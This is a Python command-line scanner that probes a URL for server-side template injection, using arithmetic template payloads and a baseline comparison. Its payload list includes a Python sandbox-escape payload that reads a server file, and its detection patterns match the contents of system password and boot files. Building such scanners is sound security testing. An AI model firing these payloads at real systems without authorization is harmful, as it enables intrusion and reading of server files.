import argparse
import ast
import logging
import re
import sys
import urllib.parse

import requests

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Define common template injection payloads
SSTI_PAYLOADS = [
    "{{7*7}}",  # Jinja2/Twig
    "${7*7}",   # Spring/Freemarker/Velocity
    "<%= 7*7 %>", #ERB
    "#{7*7}", #Thymeleaf
    "${{7*7}}", #Handlebars
    "{{''.__class__.__mro__[2].__subclasses__()[40]('./file.txt').read()}}", #Python SSTI - Example
    "<% print(7*7) %>" #ASP
]

# Content signatures that count as response evidence for the non arithmetic
# payloads: text that only appears when a server side file read succeeded.
FILE_READ_SIGNATURES = [
    re.compile(r"root:[^:\n]*:0:0:"),
    re.compile(r"\[boot loader\]", re.IGNORECASE),
]


def _compute_arithmetic(node):
    """Compute an AST node under a strict whitelist: integer literals and
    the +, -, and * operators only. Anything else raises ValueError."""
    if isinstance(node, ast.Expression):
        return _compute_arithmetic(node.body)
    if isinstance(node, ast.Constant) and isinstance(node.value, int):
        return node.value
    if isinstance(node, ast.BinOp) and isinstance(node.op, (ast.Add, ast.Sub, ast.Mult)):
        left = _compute_arithmetic(node.left)
        right = _compute_arithmetic(node.right)
        if isinstance(node.op, ast.Add):
            return left + right
        if isinstance(node.op, ast.Sub):
            return left - right
        return left * right
    if isinstance(node, ast.UnaryOp) and isinstance(node.op, ast.USub):
        return -_compute_arithmetic(node.operand)
    raise ValueError("expression outside the arithmetic whitelist")


def expected_marker(payload):
    """
    Compute a payload's expected marker directly, without ever running
    payload text. The template wrappers are stripped and the inner text is
    accepted only when it is a pure arithmetic expression made of digits
    and +, -, * characters; it is then computed through an AST whitelist.
    Non arithmetic payloads (the file read shape, the ASP print shape)
    return None and are judged by their own response evidence instead.

    Returns:
        str or None: The expected marker text, or None when the payload has
        no arithmetic marker.
    """
    inner = payload.strip()
    # Prefix order matters: the two character wrappers must be tried after
    # their longer cousins, or ${{ would lose only ${ and leave a brace
    # that fails the arithmetic character check below.
    for prefix in ("${{", "{{", "${", "#{", "<%=", "<%"):
        if inner.startswith(prefix):
            inner = inner[len(prefix):]
            break
    for suffix in ("}}", "%>", "}"):
        if inner.endswith(suffix):
            inner = inner[:-len(suffix)]
            break
    inner = inner.strip()
    if not inner or not re.fullmatch(r"[0-9\s\+\-\*]+", inner):
        return None
    try:
        tree = ast.parse(inner)
        return str(_compute_arithmetic(tree.body[0].value))
    except (SyntaxError, ValueError):
        return None


def setup_argparse():
    """
    Sets up the argument parser for the command-line interface.

    Returns:
        argparse.ArgumentParser: The parser (main calls parse_args on it).
    """
    parser = argparse.ArgumentParser(description="Detects potential Server-Side Template Injection (SSTI) vulnerabilities.")
    parser.add_argument("url", help="The URL to test for SSTI vulnerabilities.")
    parser.add_argument("-d", "--data", help="Data to send in the request body (e.g., 'param1=value1&param2=value2').", default=None)
    parser.add_argument("-H", "--header", action="append", help="Custom header(s) to send with the request (e.g., 'Content-Type: application/json').  Can be specified multiple times.", default=[]) # Allow multiple headers
    parser.add_argument("-m", "--method", help="HTTP method to use (GET or POST). Defaults to GET.", default="GET", choices=['GET', 'POST'])
    parser.add_argument("--timeout", type=int, help="Request timeout in seconds. Defaults to 10.", default=10)
    parser.add_argument("--user-agent", help="Custom User-Agent header.", default="vuln-SSTI-detector")
    return parser


def check_ssti(url, data=None, headers=None, method="GET", timeout=10, user_agent="vuln-SSTI-detector"):
    """
    Checks for SSTI vulnerabilities by injecting payloads and analyzing the response.

    Returns:
        dict: {"vulnerable": bool, "completed": int, "attempted": int}.
        A payload counts as completed when a response was received for it,
        whatever its status code; error responses are analyzed like any
        other response and never abort the remaining payloads.
    """
    if headers is None:
        headers = []
    if not isinstance(headers, list):
        logging.error("Headers must be a list of 'HeaderName: HeaderValue' strings.")
        return {"vulnerable": False, "completed": 0, "attempted": 0}

    header_dict = {}
    for header in headers:
        try:
            name, value = header.split(":", 1)
            header_dict[name.strip()] = value.strip()
        except ValueError:
            logging.warning(f"Invalid header format: {header}. Skipping.")

    header_dict['User-Agent'] = user_agent

    # Baseline first: fetch the target exactly as given, so a marker that
    # was already on the page is never reported as a computed result.
    baseline_content = None
    try:
        if method == "POST":
            baseline = requests.post(url, data=data or "", headers=header_dict, timeout=timeout)
        else:
            baseline = requests.get(url, headers=header_dict, timeout=timeout)
        baseline_content = baseline.text
    except requests.exceptions.RequestException as e:
        logging.warning(f"Baseline fetch failed: {e}. Marker findings will not be reported without a baseline.")

    completed = 0
    for payload in SSTI_PAYLOADS:
        logging.info(f"Testing payload: {payload}")
        try:
            if method == "GET":
                parts = urllib.parse.urlsplit(url)
                query = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
                query.append(("ssti_test", payload))
                test_url = urllib.parse.urlunsplit(parts._replace(
                    query=urllib.parse.urlencode(query)))
                response = requests.get(test_url, headers=header_dict, timeout=timeout)
            elif method == "POST":
                pairs = urllib.parse.parse_qsl(data or "", keep_blank_values=True)
                pairs.append(("ssti_test", payload))
                response = requests.post(url, data=urllib.parse.urlencode(pairs),
                                         headers=header_dict, timeout=timeout)
            else:
                logging.error(f"Invalid HTTP method: {method}")
                return {"vulnerable": False, "completed": completed, "attempted": len(SSTI_PAYLOADS)}
        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed for one payload, continuing with the rest: {e}")
            continue

        completed += 1
        content = response.text
        marker = expected_marker(payload)

        if marker is not None:
            # An arithmetic marker with no baseline earns nothing: the
            # branch below for file signatures can still fire without one,
            # but a bare number like 49 is too common to trust alone.
            if baseline_content is not None and marker in content and marker not in baseline_content:
                logging.warning(f"Possible SSTI vulnerability detected! Payload: {payload}, Expected Result: {marker}")
                # First positive ends the scan. The completed count in the
                # result is the honest record of how few payloads that took.
                return {"vulnerable": True, "completed": completed, "attempted": len(SSTI_PAYLOADS)}
        else:
            for signature in FILE_READ_SIGNATURES:
                if signature.search(content) and not (baseline_content and signature.search(baseline_content)):
                    logging.warning(f"Possible SSTI vulnerability detected! Payload: {payload}, response contains file content evidence.")
                    return {"vulnerable": True, "completed": completed, "attempted": len(SSTI_PAYLOADS)}

        # Reflection is logged and nothing more. A page that echoes input
        # has shown me an encoding gap, not a template engine at work.
        if payload in content:
            logging.info(f"Payload {payload} reflected in response, but the expression was not run.")

    logging.info("No SSTI vulnerabilities detected.")
    return {"vulnerable": False, "completed": completed, "attempted": len(SSTI_PAYLOADS)}


def main():
    """
    Main function to parse arguments and run the SSTI check.
    """
    parser = setup_argparse()
    args = parser.parse_args()

    if not args.url.startswith("http://") and not args.url.startswith("https://"):
        logging.error("URL must start with http:// or https://")
        sys.exit(1)

    if args.data and args.method == "GET":
        logging.warning("Using --data with GET method. The --data value is ignored for GET requests; payloads are sent in the URL query.")

    result = check_ssti(args.url, args.data, args.header, args.method, args.timeout, args.user_agent)

    if result["completed"] == 0:
        logging.error("No payload test could be delivered to the target. The scan is inconclusive.")
        print("SSTI scan inconclusive: no payload could be delivered.")
        sys.exit(1)

    if result["vulnerable"]:
        print("Possible SSTI vulnerability found.  Review the logs for more details.")
    else:
        print("No SSTI vulnerabilities detected.")


if __name__ == "__main__":
    main()
